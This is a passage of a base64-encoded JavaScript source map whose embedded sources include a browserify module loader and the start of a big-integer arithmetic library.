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QUFrQkgsTUFBQSxPQUFBLEdBQVUsS0FBVixDQUFBO0FBQUEsTUFDQSxNQUFNLENBQUMsUUFBUSxDQUFDLElBQWhCLENBQXFCLCtCQUFyQixDQURBLENBbEJHO0tBbkRMO0FBd0VBLElBQUEsSUFBRyxJQUFJLENBQUMsT0FBUjtBQUNFLE1BQUEsSUFBSSxDQUFDLFdBQUwsR0FBbUIsSUFBbkIsQ0FERjtLQXhFQTtBQTJFQSxJQUFBLElBQUcsT0FBSDthQUNFLGVBQUEsQ0FBZ0IsSUFBaEIsRUFERjtLQTVFZTtFQUFBLEVBQUE7QUFBQSxDQUFBLENBQUEsQ0FBQSxJQUFBLENBeEdqQixDQUFBIiwic291cmNlc0NvbnRlbnQiOlsiKGZ1bmN0aW9uIGUodCxuLHIpe2Z1bmN0aW9uIHMobyx1KXtpZighbltvXSl7aWYoIXRbb10pe3ZhciBhPXR5cGVvZiByZXF1aXJlPT1cImZ1bmN0aW9uXCImJnJlcXVpcmU7aWYoIXUmJmEpcmV0dXJuIGEobywhMCk7aWYoaSlyZXR1cm4gaShvLCEwKTt0aHJvdyBuZXcgRXJyb3IoXCJDYW5ub3QgZmluZCBtb2R1bGUgJ1wiK28rXCInXCIpfXZhciBmPW5bb109e2V4cG9ydHM6e319O3Rbb11bMF0uY2FsbChmLmV4cG9ydHMsZnVuY3Rpb24oZSl7dmFyIG49dFtvXVsxXVtlXTtyZXR1cm4gcyhuP246ZSl9LGYsZi5leHBvcnRzLGUsdCxuLHIpfXJldHVybiBuW29dLmV4cG9ydHN9dmFyIGk9dHlwZW9mIHJlcXVpcmU9PVwiZnVuY3Rpb25cIiYmcmVxdWlyZTtmb3IodmFyIG89MDtvPHIubGVuZ3RoO28rKylzKHJbb10pO3JldHVybiBzfSkiLCJ2YXIgYmlnSW50ID0gKGZ1bmN0aW9uICgpIHtcclxuICAgIHZhciBiYXNlID0gMTAwMDAwMDAsIGxvZ0Jhc2UgPSA3O1xyXG4gICAgdmFyIHNpZ24gPSB7XHJcbiAgICAgICAgcG9zaXRpdmU6IGZhbHNlLFxyXG4gICAgICAgIG5lZ2F0aXZlOiB0cnVlXHJcbiAgICB9O1xyXG5cclxuICAgIHZhciBub3JtYWxpemUgPSBmdW5jdGlvbiAoZmlyc3QsIHNlY29uZCkge1xyXG4gICAgICAgIHZhciBhID0gZmlyc3QudmFsdWUsIGIgPSBzZWNvbmQudmFsdWU7XHJcbiAgICAgICAgdmFyIGxlbmd0aCA9IGEubGVuZ3RoID4gYi5sZW5ndGggPyBhLmxlbmd0aCA6IGIubGVuZ3RoO1xyXG4gICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHtcclxuICAgICAgICAgICAgYVtpXSA9IGFbaV0gfHwgMDtcclxuICAgICAgICAgICAgYltpXSA9IGJbaV0gfHwgMDtcclxuICAgICAgICB9XHJcbiAgICAgICAgZm9yICh2YXIgaSA9IGxlbmd0aCAtIDE7IGkgPj0gMDsgaS0tKSB7XHJcbiAgICAgICAgICAgIGlmIChhW2ldID09PSAwICYmIGJbaV0gPT09IDApIHtcclxuICAgICAgICAgICAgICAgIGEucG9wKCk7XHJcbiAgICAgICAgICAgICAgICBiLnBvcCgpO1xyXG4gICAgICAgICAgICB9IGVsc2UgYnJlYWs7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGlmICghYS5sZW5ndGgpIGEgPSBbMF0sIGIgPSBbMF07XHJcbiAgICAgICAgZmlyc3QudmFsdWUgPSBhO1xyXG4gICAgICAgIHNlY29uZC52YWx1ZSA9IGI7XHJcbiAgICB9O1xyXG5cclxuICAgIHZhciBwYXJzZSA9IGZ1bmN0aW9uICh0ZXh0LCBmaXJzdCkge1xyXG4gICAgICAgIGlmICh0eXBlb2YgdGV4dCA9PT0gXCJvYmplY3RcIikgcmV0dXJuIHRleHQ7XHJcbiAgICAgICAgdGV4dCArPSBcIlwiO1xyXG4gICAgICAgIHZhciBzID0gc2lnbi5wb3NpdGl2ZSwgdmFsdWUgPSBbXTtcclxuICAgICAgICBpZiAodGV4dFswXSA9PT0gXCItXCIpIHtcclxuICAgICAgICAgICAgcyA9IHNpZ24ubmVnYXRpdmU7XHJcbiAgICAgICAgICAgIHRleHQgPSB0ZXh0LnNsaWNlKDEpO1xyXG4gICAgICAgIH1cclxuICAgICAgICB2YXIgdGV4dCA9IHRleHQuc3BsaXQoXCJlXCIpO1xyXG4gICAgICAgIGlmICh0ZXh0Lmxlbmd0aCA+IDIpIHRocm93IG5ldyBFcnJvcihcIkludmFsaWQgaW50ZWdlclwiKTtcclxuICAgICAgICBpZiAodGV4dFsxXSkge1xyXG4gICAgICAgICAgICB2YXIgZXhwID0gdGV4dFsxXTtcclxuICAgICAgICAgICAgaWYgKGV4cFswXSA9PT0gXCIrXCIpIGV4cCA9IGV4cC5zbGljZSgxKTtcclxuICAgICAgICAgICAgZXhwID0gcGFyc2UoZXhwKTtcclxuICAgICAgICAgICAgaWYgKGV4cC5sZXNzZXIoMCkpIHRocm93IG5ldyBFcnJvcihcIkNhbm5vdCBpbmNsdWRlIG5lZ2F0aXZlIGV4cG9uZW50IHBhcnQgZm9yIGludGVnZXJzXCIpO1xyXG4gICAgICAgICAgICB3aGlsZSAoZXhwLm5vdEVxdWFscygwKSkge1xyXG4gICAgICAgICAgICAgICAgdGV4dFswXSArPSBcIjBcIjtcclxuICAgICAgICAgICAgICAgIGV4cCA9IGV4cC5wcmV2KCk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgdGV4dCA9IHRleHRbMF07XHJcbiAgICAgICAgaWYgKHRleHQgPT09IFwiLTBcIikgdGV4dCA9IFwiMFwiO1xyXG4gICAgICAgIHZhciBpc1ZhbGlkID0gL14oWzAtOV1bMC05XSopJC8udGVzdCh0ZXh0KTtcclxuICAgICAgICBpZiAoIWlzVmFsaWQpIHRocm93IG5ldyBFcnJvcihcIkludmFsaWQgaW50ZWdlclwiKTtcclxuICAgICAgICB3aGlsZSAodGV4dC5sZW5ndGgpIHtcclxuICAgICAgICAgICAgdmFyIGRpdmlkZXIgPSB0ZXh0Lmxlbmd0aCA+IGxvZ0Jhc2UgPyB0ZXh0Lmxlbmd0aCAtIGxvZ0Jhc2UgOiAwO1xyXG4gICAgICAgICAgICB2YWx1ZS5wdXNoKCt0ZXh0LnNsaWNlKGRpdmlkZXIpKTtcclxuICAgICAgICAgICAgdGV4dCA9IHRleHQuc2xpY2UoMCwgZGl2aWRlcik7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHZhciB2YWwgPSBiaWdJbnQodmFsdWUsIHMpO1xyXG4gICAgICAgIGlmIChmaXJzdCkgbm9ybWFsaXplKGZpcnN0LCB2YWwpO1xyXG4gICAgICAgIHJldHVybiB2YWw7XHJcbiAgICB9O1xyXG5cclxuICAgIHZhciBnb2VzSW50byA9IGZ1bmN0aW9uIChhLCBiKSB7XHJcbiAgICAgICAgdmFyIGEgPSBiaWdJbnQoYSwgc2lnbi5wb3NpdGl2ZSksIGIgPSBiaWdJbnQoYiwgc2lnbi5wb3NpdGl2ZSk7XHJcbiAgICAgICAgaWYgKGEuZXF1YWxzKDApKSB0aHJvdyBuZXcgRXJyb3IoXCJDYW5ub3QgZGl2aWRlIGJ5IDBcIik7XHJcbiAgICAgICAgdmFyIG4gPSAwO1xyXG4gICAgICAgIGRvIHtcclxuICAgICAgICAgICAgdmFyIGluYyA9IDE7XHJcbiAgICAgICAgICAgIHZhciBjID0gYmlnSW50KGEudmFsdWUsIHNpZ24ucG9zaXRpdmUpLCB0ID0gYy50aW1lcygxMCk7XHJcbiAgICAgICAgICAgIHdoaWxlICh0Lmxlc3NlcihiKSkge1xyXG4gICAgICAgICAgICAgICAgYyA9IHQ7XHJcbiAgICAgICAgICAgICAgICBpbmMgKj0gMTA7XHJcbiAgICAgICAgICAgICAgICB0ID0gdC50aW1lcygxMCk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgd2hpbGUgKGMubGVzc2VyT3JFcXVhbHMoYikpIHtcclxuICAgICAgICAgICAgICAgIGIgPSBiLm1pbnVzKGMpO1xyXG4gICAgICAgICAgICAgICAgbiArPSBpbmM7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9IHdoaWxlIChhLmxlc3Nlck9yRXF1YWxzKGIpKTtcclxuXHJcbiAgICAgICAgcmV0dXJuIHtcclxuICAgICAgICAgICAgcmVtYWluZGVyOiBiLnZhbHVlLFxyXG4gICAgICAgICAgICByZXN1bHQ6IG5cclxuICAgICAgICB9O1xyXG4gICAgfTtcclxuXHJcbiAgICB2YXIgYmlnSW50ID0gZnVuY3Rpb24gKHZhbHVlLCBzKSB7XHJcbiAgICAgICAgdmFyIHNlbGYgPSB7XHJcbiAgICAgICAgICAgIHZhbHVlOiB2YWx1ZSxcclxuICAgICAgICAgICAgc2lnbjogc1xyXG4gICAgICAgIH07XHJcbiAgICAgICAgdmFyIG8gPSB7XHJcbiAgICAgICAgICAgIHZhbHVlOiB2YWx1ZSxcclxuICAgICAgICAgICAgc2lnbjogcyxcclxuICAgICAgICAgICAgbmVnYXRlOiBmdW5jdGlvbiAobSkge1xyXG4gICAgICAgICAgICAgICAgdmFyIGZpcnN0ID0gbSB8fCBzZWxmO1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGJpZ0ludChmaXJzdC52YWx1ZSwgIWZpcnN0LnNpZ24pO1xyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBhYnM6IGZ1bmN0aW9uIChtKSB7XHJcbiAgICAgICAgICAgICAgICB2YXIgZmlyc3QgPSBtIHx8IHNlbGY7XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gYmlnSW50KGZpcnN0LnZhbHVlLCBzaWduLnBvc2l0aXZlKTtcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgYWRkOiBmdW5jdGlvbiAobiwgbSkge1xyXG4gICAgICAgICAgICAgICAgdmFyIHMsIGZpcnN0ID0gc2VsZiwgc2Vjb25kO1xyXG4gICAgICAgICAgICAgICAgaWYgKG0pIChmaXJzdCA9IHBhcnNlKG4pKSAmJiAoc2Vjb25kID0gcGFyc2UobSkpO1xyXG4gICAgICAgICAgICAgICAgZWxzZSBzZWNvbmQgPSBwYXJzZShuLCBmaXJzdCk7XHJcbiAgICAgICAgICAgICAgICBzID0gZmlyc3Quc2lnbjtcclxuICAgICAgICAgICAgICAgIGlmIChmaXJzdC5zaWduICE9PSBzZWNvbmQuc2lnbikge1xyXG4gICAgICAgICAgICAgICAgICAgIGZpcnN0ID0gYmlnSW50KGZpcnN0LnZhbHVlLCBzaWduLnBvc2l0aXZlKTtcclxuICAgICAgICAgICAgICAgICAgICBzZWNvbmQgPSBiaWdJbnQoc2Vjb25kLnZhbHVlLCBzaWduLnBvc2l0aXZlKTtcclxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gcyA9PT0gc2lnbi5wb3NpdGl2ZSA/XHJcblx0XHRcdFx0XHRcdG8uc3VidHJhY3QoZmlyc3QsIHNlY29uZCkgOlxyXG5cdFx0XHRcdFx0XHRvLnN1YnRyYWN0KHNlY29uZCwgZmlyc3QpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgbm9ybWFsaXplKGZpcnN0LCBzZWNvbmQpO1xyXG4gICAgICAgICAgICAgICAgdmFyIGEgPSBmaXJzdC52YWx1ZSwgYiA9IHNlY29uZC52YWx1ZTtcclxuICAgICAgICAgICAgICAgIHZhciByZXN1bHQgPSBbXSxcclxuXHRcdFx0XHRcdGNhcnJ5ID0gMDtcclxuICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgYS5sZW5ndGggfHwgY2FycnkgPiAwOyBpKyspIHtcclxuICAgICAgICAgICAgICAgICAgICB2YXIgc3VtID0gKGFbaV0gfHwgMCkgKyAoYltpXSB8fCAwKSArIGNhcnJ5O1xyXG4gICAgICAgICAgICAgICAgICAgIGNhcnJ5ID0gc3VtID49IGJhc2UgPyAxIDogMDtcclxuICAgICAgICAgICAgICAgICAgICBzdW0gLT0gY2FycnkgKiBiYXNlO1xyXG4gICAgICAgICAgICAgICAgICAgIHJlc3VsdC5wdXNoKHN1bSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gYmlnSW50KHJlc3VsdCwgcyk7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIHBsdXM6IGZ1bmN0aW9uIChuLCBtKSB7XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gby5hZGQobiwgbSk7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIHN1YnRyYWN0OiBmdW5jdGlvbiAobiwgbSkge1xyXG4gICAgICAgICAgICAgICAgdmFyIGZpcnN0ID0gc2VsZiwgc2Vjb25kO1xyXG4gICAgICAgICAgICAgICAgaWYgKG0pIChmaXJzdCA9IHBhcnNlKG4pKSAmJiAoc2Vjb25kID0gcGFyc2UobSkpO1xyXG4gICAgICAgICAgICAgICAgZWxzZSBzZWNvbmQgPSBwYXJzZShuLCBmaXJzdCk7XHJcbiAgICAgICAgICAgICAgICBpZiAoZmlyc3Quc2lnbiAhPT0gc2Vjb25kLnNpZ24pIHJldHVybiBvLmFkZChmaXJzdCwgby5uZWdhdGUoc2Vjb25kKSk7XHJcbiAgICAgICAgICAgICAgICBpZiAoZmlyc3Quc2lnbiA9PT0gc2lnbi5uZWdhdGl2ZSkgcmV0dXJuIG8uc3VidHJhY3Qoby5uZWdhdGUoc2Vjb25kKSwgby5uZWdhdGUoZmlyc3QpKTtcclxuICAgICAgICAgICAgICAgIGlmIChvLmNvbXBhcmUoZmlyc3QsIHNlY29uZCkgPT09IC0xKSByZXR1cm4gby5uZWdhdGUoby5zdWJ0cmFjdChzZWNvbmQsIGZpcnN0KSk7XHJcbiAgICAgICAgICAgICAgICB2YXIgYSA9IGZpcnN0LnZhbHVlLCBiID0gc2Vjb25kLnZhbHVlO1xyXG4gICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IFtdLFxyXG5cdFx0XHRcdFx0Ym9ycm93ID0gMDtcclxuICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgYS5sZW5ndGg7IGkrKykge1xyXG4gICAgICAgICAgICAgICAgICAgIHZhciB0bXAgPSBhW2ldIC0gYm9ycm93O1xyXG4gICAgICAgICAgICAgICAgICAgIGJvcnJvdyA9IHRtcCA8IGJbaV0gPyAxIDogMDtcclxuICAgICAgICAgICAgICAgICAgICB2YXIgbWludWVuZCA9IChib3Jyb3cgKiBiYXNlKSArIHRtcCAtIGJbaV07XHJcbiAgICAgICAgICAgICAgICAgICAgcmVzdWx0LnB1c2gobWludWVuZCk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gYmlnSW50KHJlc3VsdCwgc2lnbi5wb3NpdGl2ZSk7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIG1pbnVzOiBmdW5jdGlvbiAobiwgbSkge1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIG8uc3VidHJhY3QobiwgbSk7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIG11bHRpcGx5OiBmdW5jdGlvbiAobiwgbSkge1xyXG4gICAgICAgICAgICAgICAgdmFyIHMsIGZpcnN0ID0gc2VsZiwgc2Vjb25kO1xyXG4gICAgICAgICAgICAgICAgaWYgKG0pIChmaXJzdCA9IHBhcnNlKG4pKSAmJiAoc2Vjb25kID0gcGFyc2UobSkpO1xyXG4gICAgICAgICAgICAgICAgZWxzZSBzZWNvbmQgPSBwYXJzZShuLCBmaXJzdCk7XHJcbiAgICAgICAgICAgICAgICBzID0gZmlyc3Quc2lnbiAhPT0gc2Vjb25kLnNpZ247XHJcbiAgICAgICAgICAgICAgICB2YXIgYSA9IGZpcnN0LnZhbHVlLCBiID0gc2Vjb25kLnZhbHVlO1xyXG4gICAgICAgICAgICAgICAgdmFyIHJlc3VsdFN1bSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhLmxlbmd0aDsgaSsrKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgcmVzdWx0U3VtW2ldID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgdmFyIGogPSBpO1xyXG4gICAgICAgICAgICAgICAgICAgIHdoaWxlIChqLS0pIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0U3VtW2ldLnB1c2goMCk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgdmFyIGNhcnJ5ID0gMDtcclxuICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgYS5sZW5ndGg7IGkrKykge1xyXG4gICAgICAgICAgICAgICAgICAgIHZhciB4ID0gYVtpXTtcclxuICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBqID0gMDsgaiA8IGIubGVuZ3RoIHx8IGNhcnJ5ID4gMDsgaisrKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHZhciB5ID0gYltqXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHByb2R1Y3QgPSB5ID8gKHggKiB5KSArIGNhcnJ5IDogY2Fycnk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhcnJ5ID0gcHJvZHVjdCA+IGJhc2UgPyBNYXRoLmZsb29yKHByb2R1Y3QgLyBiYXNlKSA6IDA7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHByb2R1Y3QgLT0gY2FycnkgKiBiYXNlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICByZXN1bHRTdW1baV0ucHVzaChwcm9kdWN0KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB2YXIgbWF4ID